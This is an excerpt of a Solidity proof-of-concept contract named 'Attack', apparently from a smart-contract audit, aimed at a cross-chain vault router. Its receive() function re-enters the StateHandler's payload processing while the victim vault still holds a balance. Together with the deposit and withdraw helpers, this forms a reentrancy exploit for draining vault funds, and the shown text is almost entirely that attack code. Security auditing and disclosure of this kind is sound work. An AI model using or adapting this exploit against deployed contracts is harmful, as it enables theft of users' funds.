...
contract Attack is Ownable, ERC1155Holder {
    ...
    constructor(
        ...
        IERC20(victimUnderlyingAsset).approve(superRouterSource, type(uint256).max);
    }

    receive() external payable {
        /// @dev the last payload id is obtained (during execution this will be the same)
        uint256 payloadId = StateHandler(stateHandlerDestination).totalPayloads();
        ...
        uint256 vaultBalance = VaultMock(victimVault).balanceOf(superDestination);
        console.log("vaultBalance", vaultBalance);
        if (vaultBalance > 999) {
            // send enough eth as gas to keep the tx alive, 1 as example
            try StateHandler(stateHandlerDestination).processPayload{value: 1}(payloadId, safeGasParam) {} catch {}
        }
    ...
    function depositIntoRouter(LiqRequest[] calldata _liqData, StateReq[] calldata _stateData)
        external
        payable
        onlyOwner
    {
        SuperRouter(superRouterSource).deposit{value: msg.value}(_liqData, _stateData);
    }

    /// @dev to make the first withdrawal from the source chain
    function withdrawFromRouter(LiqRequest[] calldata _liqData, StateReq[] calldata _stateData)
        external
        payable
        onlyOwner
    {
        SuperRouter(superRouterSource).withdraw{value: msg.value}(_stateData, _liqData);
    }
    ...
    function processPayload(uint256 payloadId) external payable {
        ...
        StateHandler(stateHandlerDestination).processPayload{value: msg.value}(payloadId, safeGasParam);
    }
